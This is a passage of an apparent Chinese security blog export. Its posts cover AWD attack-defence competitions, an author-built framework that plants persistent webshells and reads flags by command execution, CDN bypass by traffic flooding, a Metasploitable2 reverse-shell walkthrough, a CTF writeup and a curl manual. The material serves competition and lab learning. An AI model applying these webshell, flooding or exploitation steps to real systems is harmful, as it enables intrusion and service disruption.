=OO00OO00000OOOOOO [O00000O00O000O0O0 ],method =OOOOO0OO0O00OOOOO [O00000O00O000O0O0 ],passwd =OO0OO000O0O0OO0O0 [O00000O00O000O0O0 ],get_flag_cmd =OOOO0000O0OOOOOO0 )#line:36 flag .append (OOO0OO0OO0000OO0O )#line:37 save_flag ()#line:38 print (&quot;3秒后尝试提交flag:&quot;)#line:39 for O00OOOO0000OO00O0 in range (1 ,4 ):#line:40 OOO00O0O0O0OO0O00 =&apos;&gt;&apos;*O00OOOO0000OO00O0 +&apos;[&apos;+str (O00OOOO0000OO00O0 )+&apos;s&apos;+&apos;]&apos;#line:41 print (&apos;%s&apos;%OOO00O0O0O0OO0O00 ,end =&apos;\r&apos;)#line:42 time .sleep (1 )#line:43 for O0OO0O00OO0000OO0 in flag :#line:44 submit_flag (url =OO0OOOO0OOOO00OO0 ,flag =O0OO0O00OO0000OO0 )#line:45 print (&quot;60秒进行下一轮操作:&quot;)#line:46 for O00OOOO0000OO00O0 in range (1 ,61 ):#line:47 OOO00O0O0O0OO0O00 =&apos;&gt;&apos;*O00OOOO0000OO00O0 +&apos;[&apos;+str (O00OOOO0000OO00O0 )+&apos;s&apos;+&apos;]&apos;#line:48 print (&apos;%s&apos;%OOO00O0O0O0OO0O00 ,end =&apos;\r&apos;)#line:49 time .sleep (1 )#line:50 flag =[]#line:51 O00O00O000OOO000O =O00O00O000OOO000O +1 #line:52 print (O00O00O000OOO000O ) 假如只给你混淆后的代码，相信很难会理解这个函数究竟在程序中干了什么 打包成exe文件发布简介这里就要向大家介绍一款神器—pyinstaller，这是一个专门用来将Python程序打包成exe格式的应用程序，除此之外它还有一个特别大的优点，经pyinstaller打包后的程序可以无需安装Python环境直接在其他机器上运行，该程序的安装方式可以参考官网：http://www.pyinstaller.org/ 使用操作我的操作系统是windows10，这里给大家演示一下打包的操作 就拿我前几天发布的AWD框架作为例子 源码结构： 定位到pyinstaller主程序的位置，在cmd窗口中输入命令 pyinstaller -F E:\YML-AWD-FRAMEWORK\main.py -F后输入的是项目主文件路径 成功生成后会在dist文件夹下找到刚刚打包好的文件 但是当我们打开生成的程序时，却发生了闪退，为了看清错误，我们在powershell下运行程序，错误提示我们缺少自写的第三方库 相信如果用过这个打包程序的师傅都会遇到这个问题，在打包简单程序时可以正常打开运行，但是当我们写的程序包含了自写的第三方库时，就会出现异常，最开始这个问题出现在我写机器人插件的时候，无奈之下我去百度上寻找pyinstaller的详细工作方式，它在打包的时候会自动导入Python的内置库，抱着试一试的心态我把自己写的第三方库放到了Python系统库目录下，而后同上面方式进行打包，最终成功解决了这个问题，后来的几个项目打包我也是采用这种方式，都很奏效。 通过打包成exe的方式，我们可以发布exe文件，这样就可以很好的保护源代码 弊端分析对于第一种编译为pyc的方法，近年出现了pyc的反编译技术，一些ctf比赛也以此作为一个考点 有很多站点例如https://tool.lu/pyc/就可以将pyc文件还原成Python代码 对于第三种方法，可能有人会觉得很安全，有一个名为pyinstxtractor.py的脚本可以在打包完毕的程序中提取出pyc文件，我们可以通过反编译pyc文件获得源代码 ，脚本下载地址：https://sourceforge.net/projects/pyinstallerextractor/ 方法推荐函数变量混淆+pyc编译虽然pyc文件可以反编译出源代码，但是经过我多次试验，将源代码经过变量混淆后再反编译为pyc文件是很困难的，以我上面混淆完的函数为例子，它编译成pyc文件后在进行反编译结果如下： 可以看到它无法还原，甚至部分还原出来的代码都是错的 打包为exe文件加壳这个思路就很简单了，将项目用pyinstaller打包后再加壳，这样就很难进行源代码还原操作了]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建属于自己的AWD训练平台]]></title>
    <url>%2F2019%2F03%2F07%2F%E6%90%AD%E5%BB%BA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84AWD%E8%AE%AD%E7%BB%83%E5%B9%B3%E5%8F%B0%2F</url>
    <content type="text"><![CDATA[本文首发于 安恒网络空间安全讲武堂 :https://mp.weixin.qq.com/s/ffh-Jkt9UUKHErxeUMw4aw 很多师傅可能很少有接触线下赛AWD的机会，所以可能在比赛中比他人少很多经验，今天就和大家分享一下如何在资源有限的情况下去搭建自己的awd线下赛环境 因为前一段时间写awd框架的缘故，我迫切的需要找一个实战环境来实验自己的框架是否可以正常运行，翻遍各大资源站点后，终于在github上找到了一个开源项目，这里分享给大家：https://github.com/zhl2008/awd-platform 在搭建的过程中大家可能看不太懂项目中的说明文档，所以在这里我实际给大家演示一遍，其中的一些细节我尽量一一说到，另外在文末还会分享我自己写的一个积分统计板(我的第二个版本源码找不到了，所以在这里给大家分享我第一次写的那个) 因为是个人嘛，毕竟资源有限，我只有一个腾讯云的学生机在空闲，今天就以这个机器为例进行搭建，给大家看一下我的配置 这配置很低了，不过实测开启10个队伍的靶机是无压力的 首先我们装一个ubuntu16.04的云服务器，然后登陆远程的ssh 将项目克隆到服务器上： git clone https://github.com/zhl2008/awd-platform.git 然后进入项目 cd awd-platform/ 然后下载一下镜像： docker pull zhl2008/web_14.04 这块我卡了好久，他最后按文档操作会报错，后来我看源码的docker名字不是这个，而是zhl2008/web_14.04 web_14.04 所以为了方便直接可以改一下镜像的名字，这样就不用改源码去了 docker tag zhl2008/web_14.04 web_14.04 然后接下来按照文档里说的操作一下 我这里实际的命令有 python batch.py web_yunnan_simple 10 python start.py ./ 10 这里用这个web_yunnan_simple的环境做例子，这个环境非常典型，包含了很多的基础漏洞，包括我的框架就是依照这个环境测试的 到现在为止，我们的靶机就可以访问了 因为是在一个服务器上运行了多个docker，靶机的映射端口规则是: team1 ---- 8801 team3 ---- 8802 team3 ---- 8803 ....以此类推 例如在我的环境下，靶机的地址就是：http://119.29.147.75:8801-8810 各个靶机的ssh密码可以在项目的文件夹下的pass.txt文件中 ssh的端口规则是： team1 ---- 2201 team2 ---- 2202 team3 ---- 2203 ....以此类推 关于check模块，他的check脚本是不能用的，我们需要进行一些修改，这个规则要根据自己的环镜自己编写，总体思路就是判断页面是否存在，存在就加一分，不存在就减一分，在他内置check脚本的基础上，我们可以稍微修改一下靶机环境的源码，然后用check脚本去访问，在他内置的脚本中还可以修改每次加分和扣分的多少 还有一个要注意的地方就是，在项目的根目录的flag_server/中，我们要赋予score.txt 和result.txt 777权限，否则分数变动无法进行同步 关于flag的提交方式和文档是一样的 得分情况可以访问ip:8080/score.txt 像我这个 我感觉太难看了，就写了个计分板 在使用的时候改一下源码里的ip地址就可以了 计分板源码打包：https://pan.baidu.com/s/18KlIeluaTtm-kT3KuXHseQ 提取码：cvdn 最后祝x平台越办越好。]]></content>
      <tags>
        <tag>原创教程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[查看站点真实ip-CDN绕过]]></title>
    <url>%2F2019%2F03%2F06%2F%E6%9F%A5%E7%9C%8B%E7%AB%99%E7%82%B9%E7%9C%9F%E5%AE%9Eip-CDN%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[CDN（content delivery network 或 content distribution network）即内容分发网络。一些站点开启了CDN后就会隐藏掉自己的真实ip，在某些需要获取站点真实ip的工作中，这将是一个障碍，下面总结一下常见的获取站点真实ip的方法。 判断是否存在cdnping通过多地ping可以查到站点的IP地址，如果返回的ip地址不是相同的，基本可以判定存在cdn 这里分享一个在线ping 的站点http://ping.chinaz.com/ ip域名强绑我们可以使一个域名和我们当前所查到的ip强绑，如果页面发生变化，应该存在cdn，强绑只需要在本机的host文件中修改就可以了 寻找真实ip非大陆访问有些站点加cdn仅仅是为了加速，所以在非大陆地区进行访问时，通过国外的DNS解析，可能会得到站点的真实ip 邮件响应头如果站点有发送邮件功能的话，可以想办法使站点向你的邮箱发送邮件，查看邮件响应头，往往可以暴露站点的真实ip 超流量回源有些站点的cdn往往可用流量是有限的，这时我们可以发送大量的请求包，类似cc攻击，当流量到达界限时，就会发生回源现象，这通常发生在一些免费CDN套餐和小CDN厂商上，一般高防CDN不会出现这种情况。 查看解析历史这是一种成功率极高的方法，站点可能创建之初并未添加CDN，这样就会存留下解析记录，通过查看解析历史可以寻找到服务器的真实ip 一般可以在：https://www.17ce.com/上查到解析历史记录 CloudFlarefreebuf上有一篇专门写对CloudFlare CDN的绕过：https://www.freebuf.com/articles/web/41533.html]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[置顶-项目发布-YML-AWD-FRAMEWORK]]></title>
    <url>%2F2019%2F03%2F04%2F%E7%BD%AE%E9%A1%B6-%E9%A1%B9%E7%9B%AE%E5%8F%91%E5%B8%83-YML-AWD-FRAMEWORK%2F</url>
    <content type="text"><![CDATA[框架首发于 安恒网络空间安全讲武堂 :https://mp.weixin.qq.com/s/r5gc0nfids896thBIW7XFg 花了大半个寒假的时间，终于完成了一直想写的awd线下半自动框架，编写过程中学到了很多，也感谢一些师傅的指点，文末会分享部分原创核心函数 框架已在我自有服务器搭建的awd环境下经过数次调试，修补了绝大部分致命bug 开发思路： 框架整体结构|--main.py(主函数及cmd交互模块) | |--code--addshell.py(自写第三方库文件) | |--data(存放用于加载数据的TXT文件) | |--html(用于存放站点源码) 开发思路和部分模块工作原理ip和shell存储模块为了方便后续维护和新功能的添加，将以TXT文件读写的方式存储和读取ip和shell信息，方便在程序退出第二次使用时，快速加载已储存的ip和shell信息 ip录入模块由于线下awd赛事靶机ip的不同(正式比赛中可能是范围类ip，小型比赛中可能是范围类端口)，框架同时支持范围ip和端口的添加，两类例子如下 ip范围： 端口范围： 不死马上传模块不死马是awd线下赛中一大杀器，其删不掉，改不了的特性往往能在线下赛中打乱对手的比赛心态，为了提高框架在各类环境成功生成不死马的几率，作者使用了直接在靶机上命令执行的方式(网上流行的不死马PHP启动文件的方式其实对于框架编写来说更加简单，但是其触发过程中可能遭遇目标靶机waf的拦截)，在成功添加了基础shell后，可以直接使用不死马模块进行不死马上传，为适应各类基础shell，上传支持post和get两种方式。 核心代码如图 流量混淆模块在获取站点源码结构时本来想利用自己的靶机做目录遍历然后返回路径列表，后来为了提升效率选择了将源码放在本地进行遍历，在使用模块前需要在库中attack_all()函数中修改框架所在路径，如图 为了模拟真实流量，在每段正常发送的URL后都会添加？shell=(随机字符串)，已达到隐藏获取flag真实流量的目的，相应代码如图 获取flag及提交模块获取flag前需要再次添加shell，可以是生成的不死马shell，设置再次添加是为了当比赛中直接有可获取flag的后门时可以直接使用收发flag模块 同时为了避免框架出现不可预期错误，程序会将最新flag保存在data目录下，在flag获取模块中，自动的过滤了重复的flag，减轻了框架在本地环境下的运行负担 交互体验为了框架的运行稳定性，使用了cmd模块，cmd模块类型提供了一个创建命令行解析器的框架，在某部分函数出错时，不至于导致框架崩溃 使用方法和基本流程：命令集合： Command Tips ------- ----------- addip 添加shell ip和端口 addshell 添加shell路径 saveshell 保存shell到文件 showip 查看ip列表 removeip 移除某个ip clearip 清除ip列表 saveip 将ip保存到文件 updead 上传bash不死马文件(.crons.php) loadip 加载储存的IP列表 loadwebshell 加载储存的shell列表 liuliang 进行流量混淆(请先添加ip或loadip) addflagshell 添加获取flag的shell saveflagshell 将获取flag的shell储存到文件 loadflagshell 加载储存的flagshell列表 getflag 获取flag(demo: getflag-cat /flag 注意分隔符是&quot;-&quot;) exit 退出 添加ip时需要添加ip地址和端口号，分割符为空格，两者皆支持范围添加，例如下面的例子 addip 10.10.10.10 80 addip 10.10.10.10-19 80 addip 10.10.10.10 80-90 removeip 可以删除掉自己机器的ip地址 确认ip地址无误后，可以通过saveip将其保存下来 addshell命令可以添加对方机器上的预留shell，支持get和post格式，已下是输入例子 addshell /a.php c post addshell /a.php c get 其中c为a.php的密码 添加完成后通过saveshell保存下来 如果希望维持权限，可以通过Updead上传不死马文件 flagshell是特定的shell文件，因为用Python去实现菜刀的功能很麻烦，所以获取flag 暂时通过命令执行的方式进行获取,添加flagshell的语法和addshell一样 getflag需要附带获取flag的命令，添加后会提示输入提交flag的地址，这时需要用yml-flag来代替flag当做命令输入，如下图的演示 这样就可以进行自动获取和提交了 关于流量混淆模块： 本人项目是在E盘写的，所以要正常使用该模块需要放在E盘下，并将站点源码放入html目录 进行流量混淆时，需要先加载ip列表（loadip）而后使用命令liuliang进行流量混淆 为了程序更好的兼容，将程序打包成了exe可执行程序，无需安装Python环境即可使用 同时也将源码全部打包，欢迎各位大佬完善和指点 程序源码在github:https://github.com/yemoli/yml-AWD-FRAMEWORK 已打包为exe格式的文件在百度网盘：https://pan.baidu.com/s/17UWvbfer8vlCcKw3NaJ2Eg 提取码1q3j]]></content>
      <tags>
        <tag>项目</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-安恒2月赛部分writeup]]></title>
    <url>%2F2019%2F02%2F25%2F2019-%E5%AE%89%E6%81%922%E6%9C%88%E8%B5%9B%E9%83%A8%E5%88%86writeup%2F</url>
    <content type="text"><![CDATA[Cryptohahaha打开压缩包应该是CRC32爆破 密码是： tanny_is_very_beautifu1_ 打开压缩包里的PDF文件 很简单的一个排列组合问题，除去了flag{}这几个字符，组成flag的字符有以下几种情况 1@eshlcn 12eshlcn !2eshlcn !@eshlcn 写出脚本跑一下发现是1@eshlcn 脚本如下： 12345678910111213141516171819202122232425import hashlibdef hash_encode(test): sha1 = hashlib.sha1() sha1.update(test.encode('utf-8')) res = sha1.hexdigest() return resdef str_sort(s): if len(s) &lt;= 1: return [s] str_list = [] for i in range(len(s)): for j in str_sort(s[0:i] + s[i + 1:]): str_list.append(s[i] + j) return str_lists = '1@eshcn'str_list = str_sort(s)print(len(str_list), str_list)for test in str_list: test = "flag&#123;"+test+"&#125;" result = hash_encode(test) if result == "e6079c5ce56e781a50f4bf853cdb5302e0d8f054": print("flag:"+test) break flag为： flag{sh@1enc} Misc来玩个游戏吧题目如图 第一关的字符串明显是盲文，在线解密一下 https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen 得到了??41402abc4b2a76b9719d911017c592，这应该是一串MD5 ，百度一下应该是hello的 第二关要求两个文件不相同但是MD5要一样，网上有这样一篇文章 https://blog.csdn.net/sysprogram/article/details/73753354 用命令 fastcoll_v1.0.0.5.exe -p C:\windows\notepad.exe -o D:\notepad1.exe D:\notepad2.exe 生成两个文件，成功得到邮件 送你一封包含flag的邮件： Dear Professional ; Especially for you - this cutting-edge intelligence ! If you no longer wish to receive our publications simply reply with a Subject: of &quot;REMOVE&quot; and you will immediately be removed from our club . This mail is being sent in compliance with Senate bill 2216 , Title 9 ; Section 306 ! THIS IS NOT MULTI-LEVEL MARKETING . Why work for somebody else when you can become rich as few as 35 weeks . Have you ever noticed more people than ever are surfing the web and people will do almost anything to avoid mailing their bills . Well, now is your chance to capitalize on this ! WE will help YOU decrease perceived waiting time by 120% &amp; decrease perceived waiting time by 140% . You can begin at absolutely no cost to you . But don&apos;t believe us ! Mrs Jones of Minnesota tried us and says &quot;I was skeptical but it worked for me&quot; . We assure you that we operate within all applicable laws . Because the Internet operates on &quot;Internet time&quot; you must act now ! Sign up a friend and your friend will be rich too . Warmest regards . Dear Cybercitizen , We know you are interested in receiving red-hot announcement ! We will comply with all removal requests ! This mail is being sent in compliance with Senate bill 1619 ; Title 2 ; Section 301 . This is NOT unsolicited bulk mail ! Why work for somebody else when you can become rich within 53 MONTHS ! Have you ever noticed more people than ever are surfing the web and more people than ever are surfing the web . Well, now is your chance to capitalize on this . We will help you use credit cards on your website plus decrease perceived waiting time by 150% . The best thing about our system is that it is absolutely risk free for you ! But don&apos;t believe us ! Mrs Simpson of Washington tried us and says &quot;Now I&apos;m rich, Rich, RICH&quot; . We assure you that we operate within all applicable laws ! We beseech you - act now ! Sign up a friend and your friend will be rich too . Thank-you for your serious consideration of our offer ! Dear Friend ; This letter was specially selected to be sent to you ! If you no longer wish to receive our publications simply reply with a Subject: of &quot;REMOVE&quot; and you will immediately be removed from our mailing list . This mail is being sent in compliance with Senate bill 2716 , Title 2 ; Section 306 ! This is a ligitimate business proposal . Why work for somebody else when you can become rich inside 33 weeks . Have you ever noticed more people than ever are surfing the web plus more people than ever are surfing the web . Well, now is your chance to capitalize on this ! WE will help YOU SELL MORE and process your orders within seconds . You can begin at absolutely no cost to you . But don&apos;t believe us ! Mrs Jones of Kentucky tried us and says &quot;I was skeptical but it worked for me&quot; ! This offer is 100% legal ! We implore you - act now . Sign up a friend and you&apos;ll get a discount of 50% . God Bless . 正好以前遇到过这种邮件的解密站点http://www.spammimic.com/decode.shtml flag{a0dd1e2e6b87fe47e5ad0184dc291e04}]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[转载-Metasploit模块简介]]></title>
    <url>%2F2019%2F02%2F21%2F%E8%BD%AC%E8%BD%BD-Metasploit%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[本文转载自博客园 模块通过Metasploit框架所装载、集成并对外提供的最核心的渗透测试功能实现代码。分为辅助模块（Aux)、渗透攻击模块（Exploits)、后渗透攻击模块（Post)、攻击载荷模块（payloads)、编码器模块（Encoders)、空指令模块（Nops)。这些模块拥有非常清晰的结构和一个预定义好的接口，并可以组合支持信息收集、渗透攻击与后渗透攻击拓展。 辅助模块 在渗透信息搜集环节提供了大量的辅助模块支持，包括针对各种网络服务的扫描与查点、构建虚假服务收集登录密码、口令猜测等模块。此外，辅助模块中还包括一些无须加载攻击载荷，同时往往不是取得目标系统远程控制权的渗透攻击，例如：拒绝服务攻击。 渗透攻击模块 利用发现的安全漏洞或配置弱点对远程目标系统进行攻击，以植入和运行攻击载荷，从而获得对目标系统访问控制权的代码组件。metasploit框架中渗透攻击模块可以按照所利用的安全漏洞所在的位置分为主动渗透攻击与被动渗透攻击两大类。 主动渗透攻击：所利用的安全漏洞位于网络服务端软件与服务端软件承载的上层应用程序之中，由于这些服务通常是在主机上开启一些监听端口并等待客户端连接，通过连接目标系统网络服务，注入一些特殊构造的包含“邪恶”攻击数据的网络请求内容，触发安全漏洞，并使得远程服务进行执行“邪恶”数据中包含的攻击载荷，从而获取目标系统的控制会话。针对网络服务端的主动渗透攻击属于传统的渗透攻击。还有web应用程序渗透攻击、SCADA工业控制系统服务渗透攻击。 被动渗透攻击：利用漏洞位于客户端软件中，如浏览器、浏览插件、电子邮件客户端、office与Adobe等各种文档与编辑软件。对于这类存在于客户端软件的安全漏洞，我们无法主动地将数据从远程输入到客户端软件中，因此只能采用被动渗透攻击方式。即构造出“邪恶”的网页、电子邮件或文档文件，并通过架设包含此类恶意内容的服务端、发送邮件附件、结合社会工程学攻击分发并诱骗目标用户打开、结合网络欺骗和劫持技术，等目标系统上的用户访问到这些邪恶内容，从而触发客户端软件中的安全漏洞，给出控制目标系统的shell会话。客户端软件被动渗透攻击能够绕过防火墙等网络边界防护措施，最常见的两类被动渗透攻击为浏览器软件漏洞攻击和文件格式类漏洞攻击。 攻击载荷模块 攻击载荷是在渗透攻击成功后促使目标系统运行的一段植入代码，通常作用是为渗透攻击者打开在目标系统上的控制会话连接。在传统的渗透代码开发中，攻击载荷只是一段功能简单的ShellCode代码，以汇编语言编制并转换为目标系统CPU体系结构支持的机器代码，在渗透攻击触发漏洞后，将程序执行流程劫持并跳转入这段机器代码中执行，从而完成ShellCode中实现的单一功能。 metasploit攻击载荷模块分为独立（Single)、传输器（Stager)、传输体（Stage)三种类型。 独立攻击载荷是完全自包含的，可直接独立地植入目标系统进行执行，比如“windows/shell_bind_tcp”是适用于Windows操作系统平台，能够将Shell控制会话绑定在指定TCP端口上的攻击载荷。在一些比较特殊情况下，可能会对攻击载荷的大小、运行条件有所限制，比如特定安全漏洞利用时可填充邪恶攻击缓冲区的可用空间很小、windows 7等新型操作系统所引入的NX(堆栈不可执行）、DEP(数据执行保护）等安全防御机制，在这些场景情况下，Metasploit提供了传输器和传输体配对分阶段植入的技术，由渗透攻击模块首先植入代码精悍短小且非常可靠的传输器载荷，然后在运行传输器载荷时进一步下载传输体载荷并执行。 空指令模块 空指令（NOP)是一些对程序运行状态不会造成任何实质影响的空操作或无关操作指令，最典型的空指令就是空操作，在X86 CPU体系结构平台上的操作码是ox90. 在渗透攻击构造邪恶数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区，这样当触发渗透攻击后跳转执行ShellCode时，有一个较大的安全着陆区，从而避免受到内存地址随机化、返回地址计算偏差等原因造成的ShellCode执行失败，提高渗透攻击的可靠性。 编码器模块 攻击载荷与空指令模块组装完成一个指令序列后，在这段指令被渗透攻击模块加入邪恶数据缓冲区交由目标系统运行之前，Metasploit框架还需要完成一道非常重要的工序—-编码。 编码模块的第一个使命是确保攻击载荷中不会出现渗透攻击过程中应加以避免的”坏字符“。 编码器第二个使命是对攻击载荷进行”免杀“处理，即逃避反病毒软件、IDS入侵检测系统和IPS入侵防御系统的检测与阻断。 后渗透模块 主要支持在渗透攻击取得目标系统远程控制权之后，在受控系统中进行各种各样的后渗透攻击动作，比如获取敏感信息，进一步括展，实施跳板攻击等。]]></content>
      <tags>
        <tag>转载文章</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[针对Metasploitable2靶机的测试]]></title>
    <url>%2F2019%2F02%2F19%2F%E9%92%88%E5%AF%B9Metasploitable2%E9%9D%B6%E6%9C%BA%E7%9A%84%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[Metasploitable2是一个特别制作的ubuntu操作系统，主要用于安全工具测试和常见漏洞攻击的演示 首先使用msf的nmap模块对目标机进行扫描，收集可用服务信息，我这里靶机ip是192.168.11.128 nmap -sV 192.168.11.128 靶机上开启了许多端口，观察发现主机上运行着Samba 3.x服务。 Samba是在Linux系统上实现SMB协议的软件，SMB是一种在局域网上共享文件和打印机的通信协议。 输入search samba搜索可利用的漏洞模块，等待一会后会出现一些可利用的模块 从中挑选一个进行利用 use exploit/multi/samba/usermap_script 查看该利用模块下可选择的攻击载荷模块： show payloads 选择最基础的cmd/unix/reverse反向攻击载荷模块 set payload cmd/unix/reverse 然后查看需要设置的参数 show options 对应的设置靶机ip，端口和攻击机ip 输入run或者exploit进行攻击 可以看到成功获得了靶机的shell]]></content>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python实现进度条]]></title>
    <url>%2F2019%2F02%2F16%2Fpython%E5%AE%9E%E7%8E%B0%E8%BF%9B%E5%BA%A6%E6%9D%A1%2F</url>
    <content type="text"><![CDATA[最近在写python的项目，为了美观想加一个进度条，正好这里收集一下找到的众多可用例子 因为只是装饰作用，就没收集带第三方库的代码 一12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env python3import timeclass Index(object): def __init__(self, number=50, decimal=2): """ :param decimal: 你保留的保留小数位 :param number: # 号的 个数 """ self.decimal = decimal self.number = number self.a = 100 / number # 在百分比 为几时增加一个 # 号 def __call__(self, now, total): # 1. 获取当前的百分比数 percentage = self.percentage_number(now, total) # 2. 根据 现在百分比计算 well_num = int(percentage / self.a) # print("well_num: ", well_num, percentage) # 3. 打印字符进度条 progress_bar_num = self.progress_bar(well_num) # 4. 完成的进度条 result = "\r%s %s" % (progress_bar_num, percentage) return result def percentage_number(self, now, total): """ 计算百分比 :param now: 现在的数 :param total: 总数 :return: 百分 """ return round(now / total * 100, self.decimal) def progress_bar(self, num): """ 显示进度条位置 :param num: 拼接的 “#” 号的 :return: 返回的结果当前的进度条 """ # 1. "#" 号个数 well_num = "#" * num # 2. 空格的个数 space_num = " " * (self.number - num) return '[%s%s]' % (well_num, space_num)index = Index()start = 371for i in range(start + 1): print(index(i, start), end='') time.sleep(0.01) # \r 返回本行开头 # end : python 结尾不加任何操作, 默认是空格 效果图： 二1234import timefor i in range(5): time.sleep(0.3) print(str(i)*10) 效果图 三1234567import timeimport sysfor i in range(8): time.sleep(0.3) print('\r', end='') print(str(i)*10, end='') sys.stdout.flush() 效果图 四123456789import timeimport sysn = 10for i in range(n): time.sleep(0.3) sys.stdout.write('\r') sys.stdout.write(str(i)*(n-i)) sys.stdout.flush()sys.stdout.write('n') 效果图 五1234567891011import timeimport sysdef progress_test(): bar_length=20 for percent in range(0, 101): hashes = '#' * int(percent/100.0 * bar_length) spaces = ' ' * (bar_length - len(hashes)) sys.stdout.write("\rPercent: [%s] %d%%"%(hashes + spaces, percent)) sys.stdout.flush() time.sleep(1)progress_test() 效果图]]></content>
      <tags>
        <tag>代码收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[curl说明书]]></title>
    <url>%2F2019%2F02%2F15%2Fcurl%E8%AF%B4%E6%98%8E%E4%B9%A6%2F</url>
    <content type="text"><![CDATA[在以下选项中，(H) 表示仅适用 HTTP/HTTPS ，(F) 表示仅适用于 FTP --anyauth 选择 &quot;any&quot; 认证方法 (H) -a, --append 添加要上传的文件 (F/SFTP) --basic 使用HTTP基础认证（Basic Authentication）(H) --cacert FILE CA 证书，用于每次请求认证 (SSL) --capath DIR CA 证书目录 (SSL) -E, --cert CERT[:PASSWD] 客户端证书文件及密码 (SSL) --cert-type TYPE 证书文件类型 (DER/PEM/ENG) (SSL) --ciphers LIST SSL 秘钥 (SSL) --compressed 请求压缩 (使用 deflate 或 gzip) -K, --config FILE 指定配置文件 --connect-timeout SECONDS 连接超时设置 -C, --continue-at OFFSET 断点续转 -b, --cookie STRING/FILE Cookies字符串或读取Cookies的文件位置 (H) -c, --cookie-jar FILE 操作结束后，要写入 Cookies 的文件位置 (H) --create-dirs 创建必要的本地目录层次结构 --crlf 在上传时将 LF 转写为 CRLF --crlfile FILE 从指定的文件获得PEM格式CRL列表 -d, --data DATA HTTP POST 数据 (H) --data-ascii DATA ASCII 编码 HTTP POST 数据 (H) --data-binary DATA binary 编码 HTTP POST 数据 (H) --data-urlencode DATA url 编码 HTTP POST 数据 (H) --delegation STRING GSS-API 委托权限 --digest 使用数字身份验证 (H) --disable-eprt 禁止使用 EPRT 或 LPRT (F) --disable-epsv 禁止使用 EPSV (F) -D, --dump-header FILE 将头信息写入指定的文件 --egd-file FILE 为随机数据设置EGD socket路径(SSL) --engine ENGINGE 加密引擎 (SSL). &quot;--engine list&quot; 指定列表 -f, --fail 连接失败时不显示HTTP错误信息 (H) -F, --form CONTENT 模拟 HTTP 表单数据提交（multipart POST） (H) --form-string STRING 模拟 HTTP 表单数据提交 (H) --ftp-account DATA 帐户数据提交 (F) --ftp-alternative-to-user COMMAND 指定替换 &quot;USER [name]&quot; 的字符串 (F) --ftp-create-dirs 如果不存在则创建远程目录 (F) --ftp-method [MULTICWD/NOCWD/SINGLECWD] 控制 CWD (F) --ftp-pasv 使用 PASV/EPSV 替换 PORT (F) -P, --ftp-port ADR 使用指定 PORT 及地址替换 PASV (F) --ftp-skip-pasv-ip 跳过 PASV 的IP地址 (F) --ftp-pret 在 PASV 之前发送 PRET (drftpd) (F) --ftp-ssl-ccc 在认证之后发送 CCC (F) --ftp-ssl-ccc-mode ACTIVE/PASSIVE 设置 CCC 模式 (F) --ftp-ssl-control ftp 登录时需要 SSL/TLS (F) -G, --get 使用 HTTP GET 方法发送 -d 数据 (H) -g, --globoff 禁用的 URL 队列 及范围使用 {} 和 [] -H, --header LINE 要发送到服务端的自定义请求头 (H) -I, --head 仅显示响应文档头 -h, --help 显示帮助 -0, --http1.0 使用 HTTP 1.0 (H) --ignore-content-length 忽略 HTTP Content-Length 头 -i, --include 在输出中包含协议头 (H/F) -k, --insecure 允许连接到 SSL 站点，而不使用证书 (H) --interface INTERFACE 指定网络接口／地址 -4, --ipv4 将域名解析为 IPv4 地址 -6, --ipv6 将域名解析为 IPv6 地址 -j, --junk-session-cookies 读取文件中但忽略会话cookie (H) --keepalive-time SECONDS keepalive 包间隔 --key KEY 私钥文件名 (SSL/SSH) --key-type TYPE 私钥文件类型 (DER/PEM/ENG) (SSL) --krb LEVEL 启用指定安全级别的 Kerberos (F) --libcurl FILE 命令的libcurl等价代码 --limit-rate RATE 限制传输速度 -l, --list-only 只列出FTP目录的名称 (F) --local-port RANGE 强制使用的本地端口号 -L, --location 跟踪重定向 (H) --location-trusted 类似 --location 并发送验证信息到其它主机 (H) -M, --manual 显示全手动 --mail-from FROM 从这个地址发送邮件 --mail-rcpt TO 发送邮件到这个接收人(s) --mail-auth AUTH 原始电子邮件的起始地址 --max-filesize BYTES 下载的最大文件大小 (H/F) --max-redirs NUM 最大重定向数 (H) -m, --max-time SECONDS 允许的最多传输时间 --metalink 处理指定的URL上的XML文件 --negotiate 使用 HTTP Negotiate 认证 (H) -n, --netrc 必须从 .netrc 文件读取用户名和密码 --netrc-optional 使用 .netrc 或 URL; 将重写 -n 参数 --netrc-file FILE 设置要使用的 netrc 文件名 -N, --no-buffer 禁用输出流的缓存 --no-keepalive 禁用 connection 的 keepalive --no-sessionid 禁止重复使用 SSL session-ID (SSL) --noproxy 不使用代理的主机列表 --ntlm 使用 HTTP NTLM 认证 (H) -o, --output FILE 将输出写入文件，而非 stdout --pass PASS 传递给私钥的短语 (SSL/SSH) --post301 在 301 重定向后不要切换为 GET 请求 (H) --post302 在 302 重定向后不要切换为 GET 请求 (H) --post303 在 303 重定向后不要切换为 GET 请求 (H) -#, --progress-bar 以进度条显示传输进度 --proto PROTOCOLS 启用/禁用 指定的协议 --proto-redir PROTOCOLS 在重定向上 启用/禁用 指定的协议 -x, --proxy [PROTOCOL://]HOST[:PORT] 在指定的端口上使用代理 --proxy-anyauth 在代理上使用 &quot;any&quot; 认证方法 (H) --proxy-basic 在代理上使用 Basic 认证 (H) --proxy-digest 在代理上使用 Digest 认证 (H) --proxy-negotiate 在代理上使用 Negotiate 认证 (H) --proxy-ntlm 在代理上使用 NTLM 认证 (H) -U, --proxy-user USER[:PASSWORD] 代理用户名及密码 --proxy1.0 